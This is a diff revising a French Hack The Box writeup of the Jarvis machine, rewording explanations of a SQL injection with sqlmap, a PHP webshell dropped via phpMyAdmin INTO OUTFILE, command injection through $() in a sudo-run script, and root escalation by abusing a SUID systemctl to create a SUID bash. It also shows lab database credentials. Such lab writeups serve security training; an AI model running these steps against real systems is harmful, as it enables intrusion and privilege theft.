@@ -14,7 +14,7 @@ draft: true
 # --- PaperMod / navigation ---
 type: "writeups"
 summary: "Jarvis (HTB Medium) : injection SQL, accès via phpMyAdmin, injection de commandes et escalade avec systemctl SUID." 
-description: "Writeup de Jarvis (HTB Medium) : injection SQL, accès à phpMyAdmin, pivot de www-data vers pepper et escalade root via systemctl SUID."
+description: "Writeup de Jarvis (HTB Medium) : injection SQL, accès à phpMyAdmin, passage de www-data à pepper et escalade vers root via systemctl SUID."
 tags: ["Hack The Box","HTB Medium","Web","SQL Injection","sqlmap","phpMyAdmin","Command Injection","sudo","SSH","systemctl","SUID","linux-privesc"]
 categories: ["Mes writeups"]
 
@@ -49,7 +49,7 @@ ctf:
   difficulty: "Medium"
   target_ip: "10.129.x.x"
   skills: ["Enumeration","SQL Injection","sqlmap","phpMyAdmin","Command Injection","SSH","systemctl","SUID","Privilege Escalation"]
-  time_spent: "2h"
+  time_spent: "plusieurs sessions"
   # vpn_ip: "10.10.14.xx"
   # notes: "Points d'attention…"
 
@@ -60,16 +60,16 @@ ctf:
 
 # --- SEO Reminders (à compléter après création) ---
 # 1) Titre :
-#    - Doit contenir : Nom Machine + HTB Easy + Writeup
+#    - Doit contenir : Nom Machine + HTB Easy ou Medium + Writeup
 # 2) Description :
 #    - Résumé 130–160 caractères
 #    - Style “Mix Parfait” : pédagogique + technique
-#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
+#    - Exemple : "Writeup de <machine> (HTB Easy ou Medium) : énumération claire, analyse de la vulnérabilité et escalade structurée."
 # 3) ALT (image de couverture) :
 #    - Mixer vulnérabilité + pédagogie + progression
-#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
+#    - Exemple : "Machine <machine> HTB Easy ou Medium vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
 # 4) Tags :
-#    - Toujours ["Easy"]
+#    - Toujours ["Easy ou Medium"]
 #    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
 # 5) Structure :
 #    - H1 = titre
@@ -79,7 +79,7 @@ ctf:
 # --- SEO CHECKLIST (à valider avant publication) ---
 
 # [ ] 1) Titre (title + H1)
-#     - Contient : Nom Machine + HTB Easy + Writeup
+#     - Contient : Nom Machine + HTB Easy ou Medium + Writeup
 #     - Unique sur le site
 #     - Lisible hors contexte HTB
 
@@ -88,7 +88,7 @@ ctf:
 #     - Pas générique
 #     - Ton pédagogique + technique
 #     - Exemple :
-#       "Writeup de <machine> (HTB Easy) : énumération claire,
+#       "Writeup de <machine> (HTB Easy ou Medium) : énumération claire,
 #        compréhension de la vulnérabilité et escalade structurée."
 
 # [ ] 3) Image de couverture
@@ -100,7 +100,7 @@ ctf:
 #     - Décrit la machine + l’approche
 #     - Pédagogique (pas juste technique)
 #     - Exemple :
-#       "Machine <machine> HTB Easy exploitée étape par étape,
+#       "Machine <machine> HTB Easy ou Medium exploitée étape par étape,
 #        de l’énumération à l’escalade de privilèges."
 
 # [ ] 5) Tags
@@ -881,11 +881,9 @@ L’outil identifie également le système de gestion de base de données utilis
 back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
 ```
 
-L’injection SQL du paramètre `cod` est ainsi confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
+L’injection SQL du paramètre `cod` est ainsi confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MariaDB, dérivé de MySQL.
 
-La commande finale ne résulte pas d’une procédure entièrement déterministe. Elle est obtenue après plusieurs essais avec le User-Agent Firefox sous Windows, l’utilisation éventuelle du tamper `space2comment` lorsque `sqlmap` le recommande et l’identification d’un marqueur fiable pour les réponses vraies.
-
-Dans les conditions rencontrées ici, la configuration retenue repose finalement sur les éléments suivants :
+La détection n’étant pas entièrement reproductible face à IronWAF, plusieurs essais ont été nécessaires. Dans les conditions rencontrées ici, la configuration la plus stable repose finalement sur :
 
 ```text
 User-Agent Firefox sous Windows
@@ -930,7 +928,7 @@ Tu conserves les paramètres qui ont permis de stabiliser la détection précéd
 
 ```text
 --string='Suite room is perfect'
-User-Agent Firefox Windows
+User-Agent Firefox sous Windows
 --skip-waf
 ```
 
@@ -1000,11 +998,9 @@ boolean-based blind
 UNION query
 ```
 
-La technique booléenne reste exploitable, mais elle nécessite de reconstruire les données progressivement au moyen de nombreuses requêtes.
+L’injection UNION étant nettement plus efficace pour récupérer des données, tu la privilégies pour la suite de l’exploitation.
 
-L’injection UNION te permet au contraire de récupérer directement les résultats dans la réponse HTTP. Elle est donc beaucoup plus rapide et tu la privilégies pour la suite de l’exploitation.
-
-### Exploitation de l'injection SQL Union
+### Exploitation de l'injection SQL UNION
 
 #### Récupération du hash et identification du mot de passe MySQL
 
@@ -1029,7 +1025,7 @@ sqlmap \
   --passwords
 ```
 
-L’option `--passwords` demande à `sqlmap` de récupérer les comptes du SGBD ainsi que leurs éventuels mots de passe ou hashes d’authentification.
+L’option `--passwords` demande à `sqlmap` de récupérer les comptes du SGBD ainsi que leurs éventuels hashes d’authentification. Lorsque leur format est reconnu, l’outil peut ensuite proposer de tenter de retrouver les mots de passe correspondants à l’aide d’une attaque par dictionnaire.
 
 Comme le point d’injection UNION est déjà enregistré dans la session, il n’est plus nécessaire d’utiliser `--flush-session`, `sqlmap` va réutiliser les informations déjà enregistrées lors des sessions précédentes.
 
@@ -1140,8 +1136,6 @@ L’option `--file-read` demande à `sqlmap` de lire le fichier indiqué depuis 
 
 Il n’est pas nécessaire d’utiliser `--flush-session`, car `sqlmap` peut réutiliser directement le point d’injection UNION déjà confirmé.
 
-Grâce à cette technique, le contenu du fichier peut être récupéré beaucoup plus rapidement qu’avec l’injection boolean-based blind, puisque les données sont directement retournées dans la réponse HTTP.
-
 Ce qui te donne :
 
 ```bash
@@ -1200,7 +1194,7 @@ L’outil lit ensuite le fichier `/var/www/html/connection.php` :
 [INFO] fetching file: '/var/www/html/connection.php'
 ```
 
-La copie locale obtenue fait bien 75 octets, comme le fichier distant. Tu peux l’afficher avec :
+Tu peux afficher la copie locale du fichier avec :
 
 ```bash
 cat ~/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php
@@ -1225,23 +1219,11 @@ Base de données : hotel
 
 La technique UNION se montre ici particulièrement efficace : le fichier de `75` octets est récupéré en quelques secondes, alors qu’une extraction en boolean-based blind aurait nécessité de nombreuses requêtes pour reconstruire son contenu caractère par caractère.
 
-Les deux méthodes utilisées permettent donc d’obtenir les mêmes identifiants MySQL :
-
-```text
-DBadmin:imissyou
-```
-
 Tu pourrais maintenant utiliser `sqlmap` pour tenter d’obtenir directement un shell système avec l’option `--os-shell`.
 
 Cette méthode automatisée serait toutefois moins intéressante d’un point de vue pédagogique, car elle masquerait une partie importante du chemin d’exploitation.
 
-Tu choisis donc une approche plus traditionnelle : réutiliser les identifiants découverts pour te connecter à phpMyAdmin, puis exploiter les fonctionnalités disponibles dans l’interface afin de créer un petit shell PHP et d’obtenir ensuite un reverse shell.
-
-Cette démarche permettra de mieux comprendre comment un accès administratif à la base de données peut être transformé progressivement en exécution de commandes sur le serveur.
-
-
-
-
+Tu choisis donc une approche plus traditionnelle : réutiliser les identifiants découverts pour te connecter à phpMyAdmin, puis exploiter les fonctionnalités disponibles dans l’interface afin de créer un petit shell PHP et de comprendre comment un accès administratif à la base de données peut être transformé progressivement en exécution de commandes sur le serveur.
 
 ### Exploitation de `phpMyAdmin` pour obtenir une exécution de commandes
 
@@ -1271,11 +1253,9 @@ La requête retourne le résultat suivant :
 GRANT ALL PRIVILEGES ON *.* TO 'DBadmin'@'localhost'
 ```
 
-Le compte `DBadmin` dispose donc de privilèges étendus sur l’ensemble du serveur MySQL.
-
 Cette configuration confirme qu’il ne s’agit pas d’un simple compte applicatif limité à la base `hotel`. Il possède au contraire des droits administratifs particulièrement étendus.
 
-Ces privilèges peuvent notamment autoriser l’utilisation de fonctions permettant de lire ou d’écrire des fichiers depuis MySQL. Leur exploitation reste toutefois soumise à deux autres conditions :
+Ces privilèges peuvent notamment permettre à MySQL de lire ou d’écrire des fichiers sur le système. Leur exploitation reste toutefois soumise à deux autres conditions :
 
 - la configuration du serveur MySQL ne doit pas interdire l’opération ;
 - le compte système qui exécute le service MySQL doit disposer des permissions nécessaires sur le répertoire ciblé.
@@ -1321,7 +1301,7 @@ INTO OUTFILE '/var/www/html/shell.php'
 
 #### Validation de l’exécution du fichier PHP
 
-Le fichier `shell.php` étant maintenant présent dans la racine web, tu vérifies qu’il est accessible depuis le navigateur et qu’il permet bien d’exécuter une commande système.
+Après avoir exécuté la requête `INTO OUTFILE`, tu vérifies que `shell.php` est bien accessible depuis le navigateur et qu’il permet d’exécuter une commande système.
 
 Le script attend la commande à exécuter dans le paramètre GET `command`. Tu appelles donc la page avec la commande `id` :
 
@@ -1337,17 +1317,11 @@ La page retourne un résultat de ce type :
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Cette réponse confirme que le fichier PHP a correctement été écrit dans la racine web et qu’il est interprété par Apache.
-
-Elle démontre également que tu peux désormais exécuter des commandes sur le serveur avec les privilèges du compte :
-
-```text
-www-data
-```
+Cette réponse confirme que le fichier PHP est correctement interprété par Apache et que tu peux désormais exécuter des commandes sur le serveur avec les privilèges de `www-data`.
 
 Tu disposes donc d’un mini shell PHP fonctionnel. Cet accès permet d’exécuter ponctuellement des commandes depuis le navigateur, mais il reste peu pratique pour travailler de manière interactive.
 
-La prochaine étape consiste à l’utiliser pour déclencher un reverse shell vers ta machine Kali.
+La prochaine étape consiste à exploiter cette exécution de commandes pour déclencher un reverse shell vers ta machine Kali.
 
 ### Obtention d’un reverse shell
 
@@ -1438,25 +1412,21 @@ La procédure complète est détaillée dans la recette dédiée :
 
 ### Recherche d’un passage vers un utilisateur local
 
-Après avoir obtenu un shell en tant que `www-data`, tu examines les répertoires personnels présents sur la machine :
+Après avoir obtenu un shell en tant que `www-data`, tu recherches l’emplacement du fichier `user.txt` :
 
 ```bash
-ls -l /home
+find /home -name user.txt 2>/dev/null
 ```
 
-La sortie révèle notamment le répertoire de l’utilisateur `pepper` :
-
-```text
-/home/pepper
-```
-
-Tu constates également que le fichier `user.txt` se trouve dans ce répertoire :
+La commande retourne :
 
 ```text
 /home/pepper/user.txt
 ```
 
-Le compte `pepper` devient donc une cible logique. Tu dois maintenant rechercher un moyen d’exécuter des commandes avec les privilèges de cet utilisateur.
+Le premier drapeau se trouve donc dans le répertoire personnel de l’utilisateur `pepper`.
+
+Ce compte devient dès lors une cible logique. Tu dois maintenant rechercher un moyen d’exécuter des commandes avec ses privilèges.
 
 #### Consultation des permissions sudo de `www-data`
 
@@ -1664,13 +1634,13 @@ Le programme est écrit en Python 3 et propose plusieurs options :
 
 En examinant rapidement ces possibilités, tu constates que les options `-h`, `-s` et `-l` se contentent d’afficher des informations.
 
-La seule option permettant réellement à l’utilisateur de fournir une valeur au script est donc :
+La seule option permettant à l’utilisateur de fournir directement une valeur au script est :
 
 ```text
 -p
 ```
 
-Elle constitue dès lors la piste la plus intéressante à analyser.
+Elle devient donc la piste la plus intéressante à analyser.
 
 Lorsqu’elle est utilisée, le bloc principal appelle la fonction `exec_ping()` :
 
@@ -1727,7 +1697,7 @@ ping VALEUR_SAISIE
 
 puis la transmet à un interpréteur de commandes avec `os.system()`.
 
-La saisie n’est cependant jamais vérifiée comme une véritable adresse IP. Elle est seulement comparée à une liste limitée de caractères interdits avant d’être intégrée directement dans une commande système.
+La saisie n’est jamais validée comme une véritable adresse IP. Elle est seulement comparée à une liste limitée de caractères interdits avant d’être intégrée directement dans une commande système.
 
 Il faut donc rechercher une syntaxe comprise par le shell qui permettrait d’ajouter une commande sans employer les caractères filtrés.
 
@@ -1773,13 +1743,13 @@ La commande devient donc, en pratique, quelque chose de proche de :
 ping uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
 ```
 
-Comme cette valeur ne correspond pas à une adresse IP valide, `ping` tente d’en interpréter certains éléments comme des noms d’hôtes avant d’afficher une erreur, après une dizaine de secondes.
+Comme cette valeur ne correspond pas à une adresse IP valide, `ping` tente d’en interpréter certains éléments comme des noms d’hôtes avant d’afficher une erreur.
 
 ```text
 ping: groups=1000(pepper): Temporary failure in name resolution
 ```
 
-Ce message est particulièrement révélateur : la chaîne `groups=1000(pepper)` provient directement de la sortie de `id`. Cela confirme que la commande a bien été exécutée avec les privilèges de l’utilisateur `pepper`.
+Ce message est particulièrement révélateur : la chaîne `groups=1000(pepper)` provient directement de la sortie de `id`, ce qui confirme que la commande a bien été exécutée avec les privilèges de l’utilisateur `pepper`.
 
 L’injection de commandes est donc validée. La liste noire du script reste insuffisante, car elle ne bloque pas la substitution de commandes avec `$()`.
 
@@ -1896,17 +1866,22 @@ whoami
 id
 tty
 pwd
+```
+
+La sortie confirme que tu disposes bien d’une session interactive en tant que `pepper` :
+
+```text
 pepper
 uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
 /dev/pts/0
 /home/pepper
 ```
 
-Tu disposes désormais d’une véritable session SSH en tant que `pepper`, avec un terminal pleinement interactif. Cette session constitue un point de départ plus fiable pour poursuivre l’énumération locale et rechercher une élévation de privilèges vers `root`.
+Cette session constitue un point de départ plus fiable pour poursuivre l’énumération locale et rechercher une élévation de privilèges vers `root`.
 
 #### Lecture de `user.txt`
 
-Maintenant que tu disposes d’un shell en tant que `pepper`, tu peux accéder à son répertoire personnel et lire le premier drapeau de la machine :
+Maintenant que tu disposes d’une session SSH en tant que `pepper`, tu peux accéder à son répertoire personnel et lire le premier drapeau de la machine :
 
 ```bash
 cat /home/pepper/user.txt
@@ -1954,22 +1929,28 @@ Aucune capability Linux exploitable n’est donc détectée sur la machine.
 
 En suivant la recette {{< recette "privilege-escalation-linux" >}}, tu poursuis l’énumération avec `suid3num.py`.
 
-Depuis Kali, place-toi dans le répertoire contenant le script et démarre un serveur HTTP :
+Depuis Kali, tu te places dans le répertoire contenant `suid3num.py`, puis tu démarres un serveur HTTP :
 
 ```bash
 python3 -m http.server 8000
 ```
 
-Depuis la session SSH ouverte avec `pepper`, télécharge ensuite le script dans `/dev/shm` :
+Depuis la session SSH ouverte avec `pepper`, tu télécharges ensuite le script dans `/dev/shm` :
 
 ```bash
 cd /dev/shm
 wget http://10.10.x.x:8000/suid3num.py
 ```
 
+Une fois le script téléchargé, le serveur HTTP n’est plus nécessaire. Tu peux l’arrêter sur Kali avec :
+
+```bash
+Ctrl+C
+```
+
 Le répertoire `/dev/shm` convient bien à ce type de fichier temporaire. Il est généralement accessible en écriture par les utilisateurs non privilégiés et son contenu disparaît au redémarrage de la machine.
 
-Exécute ensuite le script :
+Tu exécutes ensuite le script :
 
 ```bash
 python3 suid3num.py
@@ -2016,7 +1997,7 @@ Le `s` à la place du `x` dans les permissions du propriétaire confirme la pré
 
 `systemctl` permet de gérer les services `systemd`, notamment de les démarrer, de les arrêter ou de les activer au démarrage du système.
 
-Comme `/bin/systemctl` appartient à `root` et possède ici le bit SUID, tu peux l’utiliser depuis le compte `pepper` pour enregistrer et démarrer une unité `systemd` contenant une commande de ton choix. Celle-ci sera alors exécutée avec les privilèges de `root`.
+Dans cette configuration, comme `/bin/systemctl` appartient à `root` et possède le bit SUID, tu peux l’utiliser depuis le compte `pepper` pour enregistrer et démarrer une unité `systemd` contenant une commande de ton choix. Celle-ci sera alors exécutée avec les privilèges de `root`.
 
 ### Validation de l’exécution privilégiée
 
@@ -2032,7 +2013,7 @@ La variable `TF` contient maintenant un chemin semblable à celui-ci :
 /tmp/tmp.Abc123.service
 ```
 
-Crée ensuite une unité `systemd` de type `oneshot` :
+Tu crées ensuite une unité `systemd` de type `oneshot` :
 
 ```bash
 cat > "$TF" <<'EOF'
@@ -2063,7 +2044,7 @@ Tu dois maintenant rendre cette unité accessible à `systemd` :
 
 La commande `link` crée un lien symbolique vers le fichier temporaire dans le répertoire utilisé par `systemd`.
 
-Active ensuite le service et démarre-le immédiatement :
+Tu actives ensuite le service et le démarres immédiatement :
 
 ```bash
 /bin/systemctl enable --now "$TF"
@@ -2087,13 +2068,13 @@ Cette vérification confirme que l’utilisateur `pepper` peut utiliser le binai
 
 Maintenant que l’exécution privilégiée est confirmée, tu peux créer une nouvelle unité chargée de générer une copie SUID de Bash.
 
-Commence par créer un nouveau nom de service temporaire :
+Tu commences par créer un nouveau nom de service temporaire :
 
 ```bash
 TF=$(mktemp).service
 ```
 
-Crée ensuite le contenu de l’unité :
+Tu crées ensuite le contenu de l’unité :
 
 ```bash
 cat > "$TF" <<'EOF'
@@ -2132,19 +2113,19 @@ Le premier chiffre, `4`, active le bit SUID. Les trois chiffres suivants, `755`,
 rwxr-xr-x
 ```
 
-Enregistre ensuite la nouvelle unité auprès de `systemd` :
+Tu enregistres ensuite la nouvelle unité auprès de `systemd` :
 
 ```bash
 /bin/systemctl link "$TF"
 ```
 
-Puis active-la et démarre-la immédiatement :
+Puis tu l’actives et la démarres immédiatement.
 
 ```bash
 /bin/systemctl enable --now "$TF"
 ```
 
-Une fois le service exécuté, vérifie les permissions de la copie de Bash :
+Une fois le service exécuté, tu vérifies les permissions de la copie de Bash.
 
 ```bash
 ls -l /tmp/bash-root
@@ -2156,15 +2137,11 @@ Tu dois obtenir une ligne semblable à celle-ci :
 -rwsr-xr-x 1 root root ... /tmp/bash-root
 ```
 
-La sortie confirme que le fichier appartient à `root` et que le bit SUID est actif, comme l’indique le caractère `s` dans les permissions du propriétaire :
-
-```text
--rwsr-xr-x
-```
+La sortie confirme que le fichier appartient à `root` et que le bit SUID est actif, comme l’indique le caractère `s` dans les permissions du propriétaire.
 
 ### Obtention du shell root
 
-Tu peux maintenant exécuter cette copie de Bash avec l’option `-p`, afin de conserver les privilèges effectifs hérités du bit SUID :
+Tu peux maintenant exécuter cette copie de Bash avec l’option `-p`, qui demande à Bash de conserver les privilèges effectifs obtenus grâce au bit SUID :
 
 ```bash
 /tmp/bash-root -p
@@ -2205,15 +2182,11 @@ L’escalade de privilèges est maintenant terminée : tu as obtenu un shell ave
 
 ## Conclusion
 
-La compromission de Jarvis repose sur une chaîne d’exploitation progressive combinant plusieurs faiblesses distinctes. Une injection SQL permet d’obtenir des informations sensibles et d’accéder à phpMyAdmin, utilisé ensuite pour déposer un webshell et obtenir une première exécution de commandes avec les privilèges de `www-data`.
+La compromission de Jarvis repose sur une chaîne d’exploitation progressive combinant plusieurs faiblesses. L’injection SQL permet d’obtenir les identifiants de la base de données, puis l’accès à phpMyAdmin conduit au dépôt d’un webshell et à une première exécution de commandes en tant que `www-data`.
 
-L’analyse des droits `sudo` révèle ensuite qu’un script Python peut être exécuté en tant que `pepper`. Une injection de commandes dans ce script permet de préparer un accès SSH stable à ce compte et de poursuivre l’énumération locale.
-
-Enfin, la présence du bit SUID sur `/bin/systemctl` permet de créer et de démarrer une unité `systemd` exécutée avec les privilèges de `root`. Le service génère une copie SUID de Bash, donnant accès à un shell privilégié et permettant de prendre le contrôle complet de la machine.
+L’exploitation de `simpler.py` permet ensuite de passer à l’utilisateur `pepper` et d’établir une session SSH stable. Enfin, le bit SUID attribué à `/bin/systemctl` permet de faire exécuter une unité `systemd` avec les privilèges de `root` et d’obtenir un shell privilégié.
 
 Jarvis illustre ainsi l’importance de considérer chaque faiblesse comme un maillon potentiel d’une chaîne plus large, depuis l’application web jusqu’à la compromission totale du système.
-
-
 
 ---
 
